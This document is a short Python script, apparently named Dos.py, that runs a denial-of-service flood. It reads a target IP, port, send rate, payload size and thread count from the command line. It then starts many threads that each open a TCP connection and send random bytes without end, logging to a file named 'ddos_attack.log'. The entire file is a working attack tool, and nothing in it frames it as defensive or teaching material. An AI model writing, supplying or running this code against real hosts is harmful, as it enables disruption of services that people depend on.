import os
import time
import socket
import threading
import logging
import sys

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Set up logging
logging.basicConfig(filename='ddos_attack.log', level=logging.INFO, format='%(asctime)s - %(message)s')


# Function to send packets directly
def send_packets_direct(ip, port, data, rate_limit):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            sock.send(data)
            print(f"[Direct] Sent {len(data)} bytes to {ip}:{port}")
            time.sleep(rate_limit)
    except Exception as e:
        logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
    finally:
        if sock:
            sock.close()


# Entry point
if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("Usage: python Dos.py <ip> <port> <rate_limit> <data_size> <threads>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    rate_limit = float(sys.argv[3])
    data_size = int(sys.argv[4])
    threads = int(sys.argv[5])


    # ips = input("IP Targets (separated by commas): ").split(',')
    
    # # Default values if user doesn't provide inputs
    # ports_input = input("Ports (separated by commas, leave blank for default): ")
    # ports = list(map(int, ports_input.split(','))) if ports_input else [80, 443]
    
    # rate_limit_input = input("Rate Limit (seconds between packets, leave blank for default): ")
    # rate_limit = float(rate_limit_input) if rate_limit_input else 0.1
    
    # data_size_input = input("Data Size (bytes, leave blank for default): ")
    # data_size = int(data_size_input) if data_size_input else 600 #800
    
    # threads_input = input("Number of threads (leave blank for default): ")
    # threads = int(threads_input) if threads_input else 20  #500


    data = os.urandom(data_size)

    # print(f"Starting DoS attack on {ips}:{ports} with {threads} threads...")
    time.sleep(2)

    for _ in range(threads):
        t = threading.Thread(target=send_packets_direct, args=(ip, port, data, rate_limit))
        t.start()

    # Optional: wait for threads or allow exit with Enter
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Attack stopped.")
